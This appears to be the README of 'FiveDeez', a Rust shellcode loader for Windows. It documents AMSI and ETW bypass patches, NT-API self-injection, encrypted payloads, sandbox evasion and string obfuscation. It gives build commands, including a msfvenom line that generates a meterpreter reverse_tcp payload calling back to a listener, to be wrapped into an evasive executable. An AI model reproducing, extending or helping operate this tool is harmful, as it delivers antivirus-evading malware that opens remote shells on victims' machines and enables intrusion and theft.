# FiveDeez

A Rust shellcode loader for Windows x64, cross-compiled from Linux using the
MinGW-w64 toolchain — no Windows machine or Docker required.

---

## Features

| Feature | Detail |
|---|---|
| Execution | Self-injection via NT API (`NtAllocateVirtualMemory` / `NtProtectVirtualMemory` / `NtCreateThreadEx`) — no kernel32 wrappers |
| Memory | RW alloc → copy → flip to RX before execution (no RWX pages) |
| Encryption | AES-256-GCM with a freshly generated random key/nonce per build |
| AMSI bypass | `AmsiScanBuffer` ret-0 patch (in-process) |
| ETW bypass | `EtwEventWrite` ret-0 patch (in-process) |
| Sleep jitter | Random 30–90 s pre-execution delay via `NtDelayExecution` |
| Sandbox detection | Sleep-compression check — aborts silently if time is accelerated |
| String obfuscation | All Win32 string literals obfuscated at compile time via `obfstr` |
| Binary hardening | Symbols stripped, LTO, `opt-level=z`, `panic=abort` |

---

## Prerequisites

### 1. Rust toolchain

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env          # activate for current session
echo 'source "$HOME/.cargo/env"' >> ~/.bashrc   # activate for future sessions
```

### 2. Windows x64 cross-compilation target

```bash
rustup target add x86_64-pc-windows-gnu
```

### 3. MinGW-w64 linker (Ubuntu / Debian)

```bash
sudo apt install gcc-mingw-w64-x86-64
```

### 4. OpenSSL (key generation — ships with Ubuntu by default)

```bash
sudo apt install openssl
```

---

## Project Structure

```
FiveDeez/
├── prepare.sh                    ← build script (use this)
├── Cargo.toml                    ← workspace manifest + release profile
├── Cross.toml                    ← cargo-cross config (optional, requires Docker)
├── .cargo/config.toml            ← MinGW-w64 linker config
├── encrypt_payload/              ← standalone encryption helper (CLI tool)
│   ├── Cargo.toml
│   └── src/main.rs
└── src/
    ├── main.rs                   ← entrypoint / orchestration
    ├── shellcode.rs              ← generated key + encrypted payload (auto-patched)
    ├── crypto.rs                 ← AES-256-GCM decrypt
    ├── loader.rs                 ← NT API shellcode execution
    ├── timing.rs                 ← sleep jitter + sandbox check
    └── bypass/
        ├── mod.rs
        ├── amsi.rs               ← AMSI patch
        └── etw.rs                ← ETW patch
```

---

## Usage

`prepare.sh` handles everything in a single command: generates fresh AES-256
keys, encrypts your shellcode, patches the source, and produces a named `.exe`.

```bash
./prepare.sh -i <shellcode.bin> [-o <output_name>] [--debug]
```

| Flag | Description |
|---|---|
| `-i <file>` | Raw shellcode input file **(required)** |
| `-o <name>` | Output filename without `.exe` extension (default: `fivedeez`) |
| `--debug` | Debug build (no optimisations, symbols kept) |

**Example:**

```bash
# Generate shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.10 LPORT=4444 -f raw -o beacon.bin

# Build the loader — fresh keys generated automatically
./prepare.sh -i beacon.bin -o engagementX

# Output: engagementX.exe  (unique key/nonce every run)
```

Every invocation produces a binary with a **unique AES-256 key, nonce, and
ciphertext** — even from the same shellcode input.

---

### Encrypt shellcode manually

To produce the encrypted constants without building (e.g. to inspect the
output or integrate into another workflow):

```bash
# Build the helper first
cargo build -p encrypt_payload --release

# Encrypt with your own key/nonce
./target/release/encrypt_payload beacon.bin \
    $(openssl rand -hex 32) \
    $(openssl rand -hex 12)

# Paste the printed KEY / NONCE / ENCRYPTED_SHELLCODE consts into src/shellcode.rs
# then run: ./prepare.sh -i beacon.bin
```

---

## Execution Flow

When `fivedeez.exe` runs on the target:

```
1. ETW bypass       NtDll!EtwEventWrite patched → ret 0
2. AMSI bypass      Amsi!AmsiScanBuffer patched → ret 0
3. Sleep jitter     NtDelayExecution (30–90 s random)
4. Sandbox check    Sleep compression detected → silent exit
5. Decrypt          AES-256-GCM decrypt embedded shellcode blob
6. Execute          NtAllocateVirtualMemory (RW) → copy → NtProtectVirtualMemory (RX)
                    → NtCreateThreadEx → NtWaitForSingleObject
```

---

## Tuning

Timing constants can be adjusted before building in `src/main.rs`:

```rust
const SLEEP_BASE_MS:      u64 = 30_000;  // minimum pre-exec sleep (30 s)
const SLEEP_JITTER_MS:    u64 = 60_000;  // max additional jitter  (60 s)
const SLEEP_COMPRESS_MS:  u64 = 10_000;  // sandbox check sleep    (10 s)
const SLEEP_TOLERANCE_MS: u64 =  5_000;  // early-wake tolerance   ( 5 s)
```

Set `SLEEP_BASE_MS=0` and `SLEEP_JITTER_MS=0` during development to skip the
sleep entirely.

---

## Operational Notes

- **Change nothing before use** — `prepare.sh` generates fresh keys on every
  run; there are no hardcoded defaults in the shipped binary.
- **`src/shellcode.rs` is auto-patched** by `prepare.sh` on every build. The
  version tracked in git is an inert placeholder.
- **No plaintext IOCs** — DLL/function name strings are obfuscated at compile
  time via `obfstr` and decoded on the stack at runtime.
- **`.exe` outputs and `.bin` shellcode files are gitignored** — they should
  never be committed.

---

## Dependencies

| Crate | Purpose |
|---|---|
| `aes-gcm 0.10` | AES-256-GCM authenticated encryption (pure Rust) |
| `obfstr 0.4` | Compile-time string literal obfuscation |
| `windows-sys 0.52` | NT/Win32 API bindings |
